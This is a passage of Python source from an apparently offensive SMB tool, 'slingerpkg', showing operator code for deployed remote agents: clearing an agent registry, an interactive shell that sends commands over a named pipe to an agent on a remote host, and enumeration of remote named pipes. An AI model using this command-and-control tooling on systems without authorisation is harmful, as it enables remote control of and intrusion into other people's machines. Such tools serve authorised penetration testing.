            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
            )
            from tabulate import tabulate

            registry_path = Path.home() / ".slinger" / "agents" / "deployed_agents.json"

            if not registry_path.exists():
                print_bad("No agent registry found")
                return

            # Load current registry
            with open(registry_path, "r") as f:
                registry = json.load(f)

            # Check if registry is empty
            if not registry:
                print_info("No agents in registry")
                return

            # Display all agents
            print_info(f"Agents to delete ({len(registry)} total):")

            headers = ["Agent ID", "Host", "Agent Name", "Path", "PID"]
            table_data = []

            for agent_id, agent_info in registry.items():
                table_data.append(
                    [
                        agent_info["id"],
                        agent_info["host"],
                        agent_info["name"],
                        agent_info["path"],
                        agent_info.get("process_id", "Unknown"),
                    ]
                )

            print_log(tabulate(table_data, headers=headers, tablefmt="grid"))

            # Confirm deletion
            try:
                confirm = (
                    input(f"\nDelete ALL {len(registry)} agents from registry? [y/N]: ")
                    .strip()
                    .lower()
                )
                if confirm not in ["y", "yes"]:
                    print_info("Deletion cancelled")
                    return
            except (KeyboardInterrupt, EOFError):
                print_info("\nDeletion cancelled")
                return

            # Clear the registry
            with open(registry_path, "w") as f:
                json.dump({}, f, indent=2)

            print_good(f"✓ All {len(registry)} agents removed from registry")
            print_warning("Note: This only removes the registry entries.")
            print_warning("The actual agent processes may still be running.")

        except Exception as e:
            print_bad(f"Failed to delete all agents: {e}")

    def _run_interactive_shell(self, pipe_client, agent_info):
        """Run interactive shell with the agent"""
        try:
            from slingerpkg.utils.printlib import print_info, print_good, print_bad, print_log
            import sys

            print_info(f"\n🎯 Interactive Agent Shell - {agent_info['id']}")
            print_log(f"Host: {agent_info['host']} | Path: {agent_info['path']}")
            print_log("Type 'help' for commands, 'exit' to quit")
            print_log("=" * 60)

            try:
                while True:
                    try:
                        # Get command from user
                        command = input(f"(agent) {agent_info['id']} > ").strip()

                        if not command:
                            continue

                        # Handle special commands
                        if command.lower() in ["exit", "quit"]:
                            print_info("Exiting agent shell...")
                            break
                        elif command.lower() == "help":
                            self._show_agent_help()
                            continue
                        elif command.lower() == "status":
                            self._show_agent_status(agent_info)
                            continue

                        # Send command to agent
                        if not pipe_client.send_command(command):
                            print_bad("Failed to send command")
                            continue

                        # Receive response
                        response = pipe_client.receive_response()
                        if response is None:
                            print_bad("Failed to receive response")
                            continue

                        # Display response
                        if response.strip():
                            print_log(response)

                    except KeyboardInterrupt:
                        print_info("\nUse 'exit' to quit")
                        continue
                    except EOFError:
                        print_info("\nExiting...")
                        break

            finally:
                pipe_client.disconnect()
                print_info("Agent session ended")

        except Exception as e:
            print_bad(f"Interactive shell error: {e}")

    def _show_agent_help(self):
        """Show agent command help"""
        from slingerpkg.utils.printlib import print_info, print_log

        print_info("\nAgent Commands:")
        print_log("  System Information:")
        print_log("    whoami         - Show current user")
        print_log("    hostname       - Show computer name")
        print_log("    sysinfo        - Show system information")
        print_log("    ps             - List processes")
        print_log("")
        print_log("  File Operations:")
        print_log("    dir [path]     - List directory contents")
        print_log("    cd <path>      - Change directory")
        print_log("    type <file>    - Display file contents")
        print_log("    pwd            - Show current directory")
        print_log("")
        print_log("  Control:")
        print_log("    help           - Show this help")
        print_log("    status         - Show agent status")
        print_log("    exit           - Exit agent shell")

    def _show_agent_status(self, agent_info):
        """Show agent status information"""
        from slingerpkg.utils.printlib import print_info, print_log

        print_info("\nAgent Status:")
        print_log(f"  ID: {agent_info['id']}")
        print_log(f"  Host: {agent_info['host']}")
        print_log(f"  Process: {agent_info['name']}")
        print_log(f"  Path: {agent_info['path']}")
        print_log(f"  Pipe: {agent_info['pipe_name']}")
        if agent_info.get("process_id"):
            print_log(f"  PPID: {agent_info['process_id']} (parent process)")
        else:
            print_log(f"  PPID: Unknown")
        print_log(f"  Status: {agent_info.get('status', 'Unknown')}")
        print_log(f"  Deployed: {agent_info.get('deployed_at', 'Unknown')}")

    def sizeof_fmt(self, num, suffix="B"):
        """Format file size in human readable format"""
        for unit in ["", "Ki", "Mi", "Gi", "Ti", "Pi", "Ei", "Zi"]:
            if abs(num) < 1024.0:
                return f"{num:3.1f}{unit}{suffix}"
            num /= 1024.0
        return f"{num:.1f}Yi{suffix}"

    def enumerate_named_pipes(self, args):
        """Enumerate named pipes on the remote system"""
        try:
            if not self.is_logged_in:
                print_bad("Not logged in. Please authenticate first.")
                return

            if not self.conn:
                print_bad("No SMB connection available.")
                return

            # Get verbose setting from args or current debug state
            verbose = getattr(args, "verbose", False) or getattr(self, "debug", False)

            print_info(f"Enumerating named pipes on {self.host}...")
            if verbose:
                print_debug(f"Using enumeration method: {args.method}")
                if hasattr(self, "share") and self.share:
                    print_debug(f"Current share: {self.share} (will be preserved)")

            # Create enumerator with current SMB connection
            enumerator = NamedPipeEnumerator(self.conn, verbose=verbose)

            # Enumerate pipes using specified method
            pipes = enumerator.enumerate_pipes(method=args.method)

            if pipes:
                # Display results
                output = enumerator.format_output(detailed=args.detailed)
                print(output)

                # Save to file if requested
                if args.output:
                    if enumerator.save_output(args.output, detailed=args.detailed):
                        print_good(f"Results saved to: {args.output}")
                    else:
                        print_bad(f"Failed to save results to: {args.output}")

            else:
                print_warning("No named pipes discovered.")

        except Exception as e:
            print_debug(f"Error enumerating named pipes: {e}", sys.exc_info())
            print_bad(f"Failed to enumerate named pipes: {e}")
